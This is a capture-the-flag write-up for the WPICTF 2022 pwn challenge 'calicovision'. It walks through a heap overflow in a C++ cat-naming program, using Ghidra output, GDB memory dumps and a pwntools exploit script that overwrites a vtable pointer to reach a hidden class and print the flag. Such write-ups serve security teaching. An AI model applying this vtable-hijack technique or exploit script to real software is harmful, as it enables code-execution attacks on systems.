# Table of Contents
1. [Author](#Author)
2. [CTF](#CTF)
3. [Category](#Category)
4. [Challenge Name](#Challenge-Name)
5. [Challenge Points](#Challenge-Points)
6. [Attachments](#Attachments)
7. [Challenge Description](#Challenge-Description)
8. [Solution](#Solution)

# Author
0x534b aka m0n0

# CTF
WPICTF 2022

# Category
Pwn

# Challenge Name
calicovision

# Challenge Points
\[I don't remember and the site is shut down by now...\] pts

# Challenge Description
\[I don't remember and the site is shut down by now...\]

`nc calicovision.wpi-ctf-2022-codelab.kctf.cloud 1337`

# Attachments
## calicovision
A statically linked and (luckily) non-stripped binary to exploit.

```
calicovision: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=0c5c5e040945d78b497b9828ad3fa2b9db950127, for GNU/Linux 3.2.0, with debug_info, not stripped
```

I'll spare you the ghidra pseudocode for now.

# Solution
Upon running `calicovision`, we are greeted with:
```
 _._     _,-'""`-._
(,-.`._,'(       |\`-/|
    `-.-' \ )-`( , o o)
          `-    \`_`"'-
Searching for cats...
Found cats!
-----------------------
What would you like to do?
[A] List all cats
[B] Name a cat
[C] Pet a cat
[Q] Quit
>>>
```

Let's try each of the options:
```
>>> A
There are 64 cats.
Cat #1: Unnamed :( (Persian cat)
Cat #2: Unnamed :( (American Shorthair)
Cat #3: Unnamed :( (Manx cat)

...

Cat #62: Unnamed :( (Manx cat)
Cat #63: Unnamed :( (American Shorthair)
Cat #64: Unnamed :( (Manx cat)
```

We get a list of 64 cats, each unnamed (for now) and of one of the following breeds:
- American Shorthair
- Manx cat
- Persian cat

How about we give one a name:
```
>>> B
Naming cat #50
Enter a name: moob 
Cat named!
```

It looks like the program chooses one for us to name. We can list the cats again and see the new name:
```
>>> A
There are 64 cats.
Cat #1: Unnamed :( (Persian cat)
...
Cat #49: Unnamed :( (Manx cat)
Cat #50: moob (Manx cat)
Cat #51: Unnamed :( (Persian cat)
...
Cat #64: Unnamed :( (Manx cat)
```

Let's try petting our new friend:
```
>>> C
Which # cat do you want to pet? 50
Petting cat #50...
You pet the cat, but it doesn't seem to care.
What would you like to do?
```

It looks like moob isn't so happy to see us :(

Since a cat's name is the only input we seem to have any meaningful control over, how about we try some extreme inputs such as a very long name:
```
>>> B
Naming cat #4
Enter a name: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
Cat named!
...
>>> A
There are 64 cats.
Cat #1: Unnamed :( (Persian cat)
Cat #2: Unnamed :( (American Shorthair)
Cat #3: Unnamed :( (Manx cat)
Cat #4: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD (Persian cat)
[1]    13427 segmentation fault (core dumped)  ./calicovision
```

Bingo! Our cat ends up with the name `"D"*127` (shorter than our input name of `"D"*200`) and somehow seems to screw up the next cat such that the program crashes when we try to print it.

We can try this in GDB to see how the crash occurrs, and it seems at some point the program tries to call a function at the address pointed to by the RAX register:
```
0x4052fd <list_cats()+317>    call   qword ptr [rax]
```

Additionally, it looks like we've overwritten it:
```
RAX  0x4444444444444444 ('DDDDDDDD')
```

We can find the offset in our input that this value is coming from by using a pattern as input using `pwntools`:
```
$ pwn cyclic -n 8 200       
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
...
pwndbg> r
Starting program: /home/sox/ctf/wpictf-2022/pwn/calicovision_COMPLETE/calicovision 
 _._     _,-'""`-._
(,-.`._,'(       |\`-/|
    `-.-' \ )-`( , o o)
          `-    \`_`"'-
Searching for cats...
Found cats!
-----------------------
What would you like to do?
[A] List all cats
[B] Name a cat
[C] Pet a cat
[Q] Quit
>>> B
Naming cat #62
Enter a name: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
Cat named!
...
What would you like to do?
[A] List all cats
[B] Name a cat
[C] Pet a cat
[Q] Quit
>>> A
There are 64 cats.
Cat #1: Unnamed :( (Manx cat)
...
Cat #61: Unnamed :( (Persian cat)
Cat #62: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaa (American Shorthair)

Program received signal SIGSEGV, Segmentation fault.
...
RAX  0x616161616161616a ('jaaaaaaa')
...
$ pwn cyclic -n 8 -l jaaaaaaa
72
```

So it looks like we end up jumping to whatever address we place 72 characters into our input. How exactly does this work? And, more importantly, where do we want to branch to? Remember that the binary is statically linked, meaning we probably aren't lucky enough to have any [`one_gadget`s](https://github.com/david942j/one_gadget) laying around.

Let's take a look under the hood with the help of ghidra:
```c
int main(void)

{
  long *plVar1;
  ctype<char> cVar2;
  int iVar3;
  time_t tVar4;
  char **ppcVar5;
  basic_ostream *pbVar6;
  basic_ostream<char,std::char_traits<char>> *pbVar7;
  char menu_selection;
  
  tVar4 = time((time_t *)0x0);
  srand((uint)tVar4);
  iVar3 = rand();
  ppcVar5 = (char **)(cat_banners.
                      super__Vector_base<std::__cxx11::basic_string<char,_std::char_traits<char>,_st d::allocator<char>_>,_std::allocator<std::__cxx11::basic_string<char,_std::cha r_traits<char>,_std::allocator<char>_>_>_>
                      ._M_impl._0_8_ +
                     ((ulong)(long)iVar3 %
                     (ulong)(cat_banners.
                             super__Vector_base<std::__cxx11::basic_string<char,_std::char_traits<ch ar>,_std::allocator<char>_>,_std::allocator<std::__cxx11::basic_string< char,_std::char_traits<char>,_std::allocator<char>_>_>_>
                             ._M_impl._8_8_ -
                             cat_banners.
                             super__Vector_base<std::__cxx11::basic_string<char,_std::char_traits<ch ar>,_std::allocator<char>_>,_std::allocator<std::__cxx11::basic_string< char,_std::char_traits<char>,_std::allocator<char>_>_>_>
                             ._M_impl._0_8_ >> 5)) * 0x20);
  pbVar6 = std::__ostream_insert<char,std::char_traits<char>>
                     ((basic_ostream *)std::cout,*ppcVar5,(long)ppcVar5[1]);
  std::endl<char,std::char_traits<char>>(pbVar6);
  std::__ostream_insert<char,std::char_traits<char>>
            ((basic_ostream *)std::cout,"Searching for cats...",0x15);
  std::endl<char,std::char_traits<char>>((basic_ostream *)std::cout);
  gen_cats();
  std::__ostream_insert<char,std::char_traits<char>>((basic_ostream *)std::cout,"Found cats!",0xb);
  std::endl<char,std::char_traits<char>>((basic_ostream *)std::cout);
  std::__ostream_insert<char,std::char_traits<char>>
            ((basic_ostream *)std::cout,"-----------------------",0x17);
  std::endl<char,std::char_traits<char>>((basic_ostream *)std::cout);
  while( true ) {
                    /* what would you like to do */
    std::__ostream_insert<char,std::char_traits<char>>
              ((basic_ostream *)std::cout,"What would you like to do?",0x1a);
    plVar1 = *(long **)(std::cout + *(long *)(&DAT_ffffffffffffffe8 + std::cout._0_8_) + 0xf0);
                    /* main loop */
    if (plVar1 == (long *)0x0) break;
    if (*(ctype<char> *)(plVar1 + 7) == (ctype<char>)0x0) {
      std::ctype<char>::_M_widen_init((ctype<char> *)plVar1);
      cVar2 = (ctype<char>)0xa;
      if (*(code **)(*plVar1 + 0x30) != std::ctype<char>::do_widen) {
        cVar2 = (ctype<char>)(**(code **)(*plVar1 + 0x30))(plVar1);
      }
    }
    else {
      cVar2 = *(ctype<char> *)((long)plVar1 + 0x43);
    }
    pbVar7 = (basic_ostream<char,std::char_traits<char>> *)
             std::basic_ostream<char,std::char_traits<char>>::put
                       ((basic_ostream<char,std::char_traits<char>> *)std::cout,(char)cVar2);
    std::basic_ostream<char,std::char_traits<char>>::flush(pbVar7);
    std::__ostream_insert<char,std::char_traits<char>>
              ((basic_ostream *)std::cout,"[A] List all cats",0x11);
    plVar1 = *(long **)(std::cout + *(long *)(&DAT_ffffffffffffffe8 + std::cout._0_8_) + 0xf0);
    if (plVar1 == (long *)0x0) break;
    if (*(ctype<char> *)(plVar1 + 7) == (ctype<char>)0x0) {
      std::ctype<char>::_M_widen_init((ctype<char> *)plVar1);
      cVar2 = (ctype<char>)0xa;
      if (*(code **)(*plVar1 + 0x30) != std::ctype<char>::do_widen) {
        cVar2 = (ctype<char>)(**(code **)(*plVar1 + 0x30))(plVar1);
      }
    }
    else {
      cVar2 = *(ctype<char> *)((long)plVar1 + 0x43);
    }
    pbVar7 = (basic_ostream<char,std::char_traits<char>> *)
             std::basic_ostream<char,std::char_traits<char>>::put
                       ((basic_ostream<char,std::char_traits<char>> *)std::cout,(char)cVar2);
    std::basic_ostream<char,std::char_traits<char>>::flush(pbVar7);
    std::__ostream_insert<char,std::char_traits<char>>
              ((basic_ostream *)std::cout,"[B] Name a cat",0xe);
    plVar1 = *(long **)(std::cout + *(long *)(&DAT_ffffffffffffffe8 + std::cout._0_8_) + 0xf0);
    if (plVar1 == (long *)0x0) break;
    if (*(ctype<char> *)(plVar1 + 7) == (ctype<char>)0x0) {
      std::ctype<char>::_M_widen_init((ctype<char> *)plVar1);
      cVar2 = (ctype<char>)0xa;
      if (*(code **)(*plVar1 + 0x30) != std::ctype<char>::do_widen) {
        cVar2 = (ctype<char>)(**(code **)(*plVar1 + 0x30))(plVar1);
      }
    }
    else {
      cVar2 = *(ctype<char> *)((long)plVar1 + 0x43);
    }
    pbVar7 = (basic_ostream<char,std::char_traits<char>> *)
             std::basic_ostream<char,std::char_traits<char>>::put
                       ((basic_ostream<char,std::char_traits<char>> *)std::cout,(char)cVar2);
    std::basic_ostream<char,std::char_traits<char>>::flush(pbVar7);
    std::__ostream_insert<char,std::char_traits<char>>
              ((basic_ostream *)std::cout,"[C] Pet a cat",0xd);
    plVar1 = *(long **)(std::cout + *(long *)(&DAT_ffffffffffffffe8 + std::cout._0_8_) + 0xf0);
    if (plVar1 == (long *)0x0) break;
    if (*(ctype<char> *)(plVar1 + 7) == (ctype<char>)0x0) {
      std::ctype<char>::_M_widen_init((ctype<char> *)plVar1);
      cVar2 = (ctype<char>)0xa;
      if (*(code **)(*plVar1 + 0x30) != std::ctype<char>::do_widen) {
        cVar2 = (ctype<char>)(**(code **)(*plVar1 + 0x30))(plVar1);
      }
    }
    else {
      cVar2 = *(ctype<char> *)((long)plVar1 + 0x43);
    }
    pbVar7 = (basic_ostream<char,std::char_traits<char>> *)
             std::basic_ostream<char,std::char_traits<char>>::put
                       ((basic_ostream<char,std::char_traits<char>> *)std::cout,(char)cVar2);
    std::basic_ostream<char,std::char_traits<char>>::flush(pbVar7);
    std::__ostream_insert<char,std::char_traits<char>>((basic_ostream *)std::cout,"[Q] Quit",8);
    plVar1 = *(long **)(std::cout + *(long *)(&DAT_ffffffffffffffe8 + std::cout._0_8_) + 0xf0);
    if (plVar1 == (long *)0x0) break;
    if (*(ctype<char> *)(plVar1 + 7) == (ctype<char>)0x0) {
      std::ctype<char>::_M_widen_init((ctype<char> *)plVar1);
      cVar2 = (ctype<char>)0xa;
      if (*(code **)(*plVar1 + 0x30) != std::ctype<char>::do_widen) {
        cVar2 = (ctype<char>)(**(code **)(*plVar1 + 0x30))(plVar1);
      }
    }
    else {
      cVar2 = *(ctype<char> *)((long)plVar1 + 0x43);
    }
    pbVar7 = (basic_ostream<char,std::char_traits<char>> *)
             std::basic_ostream<char,std::char_traits<char>>::put
                       ((basic_ostream<char,std::char_traits<char>> *)std::cout,(char)cVar2);
    std::basic_ostream<char,std::char_traits<char>>::flush(pbVar7);
    std::__ostream_insert<char,std::char_traits<char>>((basic_ostream *)std::cout,">>> ",4);
    std::operator>>((basic_istream *)std::cin,&menu_selection);
    std::basic_istream<char,std::char_traits<char>>::ignore
              ((basic_istream<char,std::char_traits<char>> *)std::cin);
    iVar3 = toupper((int)menu_selection);
    menu_selection = (char)iVar3;
    if (menu_selection == 'B') {
      name_cat();
    }
    else if (menu_selection == 'C') {
      pet_cat();
    }
    else if (menu_selection == 'A') {
      list_cats();
    }
    if (menu_selection == 'Q') {
      return 0;
    }
  }
                    /* WARNING: Subroutine does not return */
  std::__throw_bad_cast();
}
```

:scream:

This... is not the vanilla C code we usually expect to see from ghidra. Judging from the data types, templates, and `std` namespace, it looks like it was written in C++.

If we look closely, we see a call to `gen_cats` which presumably generates the 64 cats at the beginning of the program. Here's what ghidra gives us:
```c
void gen_cats(void)

{
  int iVar1;
  Cat *pCVar2;
  array<Cat*,_64> *paVar3;
  
  paVar3 = &cats;
  do {
    iVar1 = rand();
    iVar1 = iVar1 % 3;
    if (iVar1 == 1) {
      pCVar2 = (Cat *)operator.new(0x48);
      pCVar2->_vptr.Cat = (anon_subr_int_varargs_for__vptr.Cat **)&PTR_breed_005b0018;
    }
    else if (iVar1 == 2) {
      pCVar2 = (Cat *)operator.new(0x48);
      pCVar2->_vptr.Cat = (anon_subr_int_varargs_for__vptr.Cat **)&PTR_breed_005b0040;
    }
    else {
      if (iVar1 != 0) {
                    /* WARNING: Subroutine does not return */
        __assert_fail("c","main.cc",0xa9,"void gen_cats()");
      }
      pCVar2 = (Cat *)operator.new(0x48);
      pCVar2->_vptr.Cat = (anon_subr_int_varargs_for__vptr.Cat **)&PTR_breed_005afff0;
    }
    paVar3->_M_elems[0] = pCVar2;
    paVar3 = (array<Cat*,_64> *)((long)paVar3 + 8);
    *(undefined8 *)pCVar2->m_name_ = 0x2064656d616e6e55;
    *(undefined2 *)(pCVar2->m_name_ + 8) = 0x283a;
    pCVar2->m_name_[10] = '\0';
  } while (paVar3 != (array<Cat*,_64> *)&std::__ioinit);
  return;
}
```

After some manual de-mangling, it looks like this:
```c
void gen_cats(void)
{
    int choice;
    Cat *pCurCat;
    Cat **ppCurCat;

    ppCurCat = &cats;

    while (ppCurCat != cats + 64) {
        // randomly choose a breed
        choice = rand();
        choice = choice % 3;
        if (choice == 1) {
            // note: this is interpreted from the operator.new(0x48) call
            //   meaning that the class only allocates 0x48 (72) bytes of space for fields
            //   which explains how we end up overwriting other data after that offset
            pCurCat = new AmericanShorthair{};
        }
        else if (choice == 2) {
            pCurCat = new PersianCat{};
        }
        else if (choice == 0) {
            pCurCat = new Manx{};
        }
        // impossible
        else {
            __assert_fail("c","main.cc",0xa9,"void gen_cats()");
        }
        ppCurCat[0] = pCurCat;
        ppCurCat++;
        // note: Cat::name is a `char[]`, and not a `std::string` or `char *` to another location
        pCurCat->name = "Unnamed :(";
    }
}
```

It the cats are owned as polymorphic `Cat` pointers by a global array, and each breed is a different sub-class. Let's check out what this looks like in memory:
```
pwndbg> p cats
$1 = {
  _M_elems = {0x5c2760, 0x5d4960, 0x5d49b0, 0x5d4a00, 0x5d4a50, 0x5d4aa0, 0x5d4af0, 0x5d4b40, 0x5d4b90, 0x5d4be0, 0x5d4c30, 0x5d4c80, 0x5d4cd0, 0x5d4d20, 0x5d4d70, 0x5d4dc0, 0x5d4e10, 0x5d4e60, 0x5d4eb0, 0x5d4f00, 0x5d4f50, 0x5d4fa0, 0x5d4ff0, 0x5d5040, 0x5d5090, 0x5d50e0, 0x5d5130, 0x5d5180, 0x5d51d0, 0x5d5220, 0x5d5270, 0x5d52c0, 0x5d5310, 0x5d5360, 0x5d53b0, 0x5d5400, 0x5d5450, 0x5d54a0, 0x5d54f0, 0x5d5540, 0x5d5590, 0x5d55e0, 0x5d5630, 0x5d5680, 0x5d56d0, 0x5d5720, 0x5d5770, 0x5d57c0, 0x5d5810, 0x5d5860, 0x5d58b0, 0x5d5900, 0x5d5950, 0x5d59a0, 0x5d59f0, 0x5d5a40, 0x5d5a90, 0x5d5ae0, 0x5d5b30, 0x5d5b80, 0x5d5bd0, 0x5d5c20, 0x5d5c70, 0x5d5cc0}
}
```

It seems like most of them are allocated fairly close if not right next to each other on the heap, lending weight to our idea that naming a cat could overwrite data in a subsequent cat. But, what data? Taking a peek inside a couple adjascent `Cat` objects before and after naming yields:
```
pwndbg> p *(Cat *)0x5d5220
$3 = {
  _vptr.Cat = 0x5afff0 <vtable for Manx+16>,
  m_name_ = "Unnamed :(", '\000' <repeats 53 times>
}
pwndbg> p *(Cat *)0x5d5270
$4 = {
  _vptr.Cat = 0x5b0018 <vtable for AmericanShorthair+16>,
  m_name_ = "Unnamed :(", '\000' <repeats 53 times>
}
pwndbg> x/100gx 0x5d4950
0x5d5210:	0x0000000000000000	0x0000000000000051 // < heap chunk header (non-free chunk of size 0x50)
0x5d5220:	0x00000000005afff0	0x2064656d616e6e55 // vtable for Manx+16 | "Unnamed :("
0x5d5230:	0x000000000000283a	0x0000000000000000
0x5d5240:	0x0000000000000000	0x0000000000000000
0x5d5250:	0x0000000000000000	0x0000000000000000
0x5d5260:	0x0000000000000000	0x0000000000000051 // < heap chunk header (non-free chunk of size 0x50)
0x5d5270:	0x00000000005b0018	0x2064656d616e6e55 // vtable for AmericanShorthair+16 | "Unnamed :("
0x5d5280:	0x000000000000283a	0x0000000000000000
0x5d5290:	0x0000000000000000	0x0000000000000000
0x5d52a0:	0x0000000000000000	0x0000000000000000
...
>>> B
Naming cat #30
// naming the cat "A"*72 + "B"*8
Enter a name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
Cat named!
...
pwndbg> p *(Cat *)0x5d5220
$8 = {
  _vptr.Cat = 0x5afff0 <vtable for Manx+16>,
  m_name_ = 'A' <repeats 64 times>
}
pwndbg> p *(Cat *)0x5d5270
$7 = {
  _vptr.Cat = 0x4242424242424242,
  m_name_ = "\000\000named :(", '\000' <repeats 53 times>
}
pwndbg> x/100gx 0x5d5210
0x5d5210:	0x0000000000000000	0x0000000000000051
0x5d5220:	0x00000000005afff0	0x4141414141414141
0x5d5230:	0x4141414141414141	0x4141414141414141
0x5d5240:	0x4141414141414141	0x4141414141414141
0x5d5250:	0x4141414141414141	0x4141414141414141
0x5d5260:	0x4141414141414141	0x4141414141414141
0x5d5270:	0x4242424242424242	0x2064656d616e0000
0x5d5280:	0x000000000000283a	0x0000000000000000
0x5d5290:	0x0000000000000000	0x0000000000000000
0x5d52a0:	0x0000000000000000	0x0000000000000000
```

So our input at offset 72 overwrites the next cat's vtable pointer! The overflow takes place in the `name_cat` function:
```c
int choice;
char *my_input;
...
// randomly choose a cat
choice = rand();
...
cat = cats[choice & 0x3f];
my_input = cat->name;

// read my input up to 0x80 (128) bytes
//   this explains how the name input ends up being 127 characters (+1 for the null terminator) long
fgets(my_input,0x80,(FILE *)stdin);
...
```

If we were to use this to overwrite a cat's vptr to a different breed's pointer, we could change its behavior when its virtual functions are called. But when are these virtual functions used? Well, in ghidra we can see three of them:
```c
// returns the name of the breed; called 
virtual char *Cat::breed(void);

// returns a description of the breed; never called in the binary
virtual char *Cat::extra_info(void);

// prints a short message; called when you pet the cat
virtual void Cat::pet(void);
```

After some more rooting around in ghidra, I found that there is a fourth hidden breed of cat, the `HackerCat`, which does not occur naturally in the cat generation. I decided to create one (by overwriting a cat's vtable pointer to the one for a `HackerCat` (0x005b0058 + 16)) and then pet it. Here's my exploit script:
```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./calicovision
from pwn import *
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./calicovision')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote('calicovision.wpi-ctf-2022-codelab.kctf.cloud',1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
init-pwndbg
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

print(io.recvuntil(b'>>> '))

io.sendline(b'B')

print(io.recvuntil(b': '))

pl = b'A'*72
pl += p64(0x005b0058 + 0x10) # hacker cat vtable + 0x10

io.sendline(pl)

print(io.recvuntil(b'>>> '))

io.sendline(b'A')

print(io.recvuntil(b'>>> '))

io.interactive()

# find the hacker cat and pet it
```

When I pet the hacker cat, it gives me the flag:
```
You approach the hacker cat to pet it, but it yowls at you: WPI{somebody_once_told_me_the_world_was_gonna_roll_me}
```

Except... the flag doesn't work :sweat_smile:

I had to reach out to an admin on the discord server to get it fixed, because apparently nobody got here yet B)

Here's the real flag:
`WPI{c0rrup73d_c475_cr3473_ch405}`